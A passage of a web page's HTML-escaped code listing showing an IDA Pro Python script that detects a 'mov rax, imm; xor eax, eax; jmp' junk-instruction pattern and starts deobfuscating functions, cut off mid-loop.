class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;205&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;206&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;207&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;208&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;209&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;210&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;211&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;213&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;214&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;215&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;216&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;217&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;218&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;219&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ida_ua, idautils, idc, idaapi, ida_bytes, ida_funcs, ida_hexrays, ida_name, ida_idp, ida_segment&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; ida_ua &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; insn_t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; collections &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; deque&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_register_map&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    reg_map = &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    proc = ida_idp.ph.regnames&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; idx, reg_name &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;enumerate&lt;/span&gt;(proc):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; reg_name:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            reg_map[idx] = reg_name.lower()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; reg_map&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_instruction_at&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;address&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    insn = idaapi.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    length = ida_ua.decode_insn(insn, address)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; length == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;0x&lt;span class=&#34;subst&#34;&gt;&amp;#123;address:x&amp;#125;&lt;/span&gt;: No valid instruction found&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mnemonic = insn.get_canon_mnem()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    disasm = idc.generate_disasm_line(address, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    clean_disasm = idaapi.tag_remove(disasm)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; clean_disasm:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        operand_part = clean_disasm.split(&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        operand_part = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bytes_data = ida_bytes.get_bytes(address, length)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hex_bytes = &lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;.join(&lt;span class=&#34;string&#34;&gt;f&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;b:02x&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; b &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; bytes_data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hex_bytes = &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;.fromhex(hex_bytes)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; address, &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(hex_bytes), mnemonic, operand_part&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;is_messed_instruction&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;call_loc&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    instructions of the type:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    mov     rax, 48FFFF08EB0B6754h&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    xor eax, eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; reg_map&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cur_insn = ida_ua.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    insn_len = ida_ua.decode_insn(cur_insn, call_loc)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; insn_len != &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# check if it&amp;#x27;s a mov to rax with a large immediate&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; cur_insn.get_canon_mnem() != &lt;span class=&#34;string&#34;&gt;&amp;#x27;mov&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; reg_map[cur_insn.Op1.reg] != &lt;span class=&#34;string&#34;&gt;&amp;#x27;rax&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        hex_value = &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(cur_insn.Op2.value)[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;.fromhex(hex_value)) != &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; (KeyError, ValueError):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# check the second instruction (xor eax, eax)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    next_insn = ida_ua.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    next_insn_len = ida_ua.decode_insn(next_insn, call_loc+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; next_insn_len != &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; next_insn.get_canon_mnem() != &lt;span class=&#34;string&#34;&gt;&amp;#x27;xor&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; reg_map[next_insn.Op1.reg] != &lt;span class=&#34;string&#34;&gt;&amp;#x27;rax&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; reg_map[next_insn.Op2.reg] != &lt;span class=&#34;string&#34;&gt;&amp;#x27;rax&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; KeyError:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# now we know for sure it is a messed instruction&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# calculate the jump address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    jmp_insn = ida_ua.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    jmp_insn_len = ida_ua.decode_insn(jmp_insn, call_loc+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; jmp_insn_len == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; jmp_insn.get_canon_mnem() != &lt;span class=&#34;string&#34;&gt;&amp;#x27;jmp&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# jmp address - return as an integer, not a hex string&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    jmp_addr = jmp_insn.Op1.addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;jmp_addr = &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(jmp_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;, jmp_addr, jmp_addr - call_loc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;deobfuscate_function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;start_addr, end_addr=&lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    deobfuscate a function from start_addr to end_addr.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    if end_addr is not provided, use the function&amp;#x27;s end address.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;Deobfuscating function at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(start_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# if end_addr is not provided, try to get it from IDA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; end_addr &lt;span class=&#34;keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        func = ida_funcs.get_func(start_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; func:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            end_addr = func.end_ea&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;Warning: Could not determine end address for function at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(start_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# try to find the next function and use its start as our end&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            next_func = ida_funcs.get_next_func(start_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; next_func:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                end_addr = next_func.start_ea&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;Error: Cannot determine end address for function at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(start_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;function bounds: &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(start_addr)&amp;#125;&lt;/span&gt; - &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(end_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# queue for functions to deobfuscate (DFS)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    functions_to_process = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    curr_addr = start_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; curr_addr &amp;lt; end_addr:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# check if it&amp;#x27;s a &amp;quot;messed&amp;quot; instruction&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = is_messed_instruction(curr_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; result:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            is_messed, jmp_addr, length = result&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;Found messed instruction at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(curr_addr)&amp;#125;&lt;/span&gt;, jumping to &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(jmp_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span 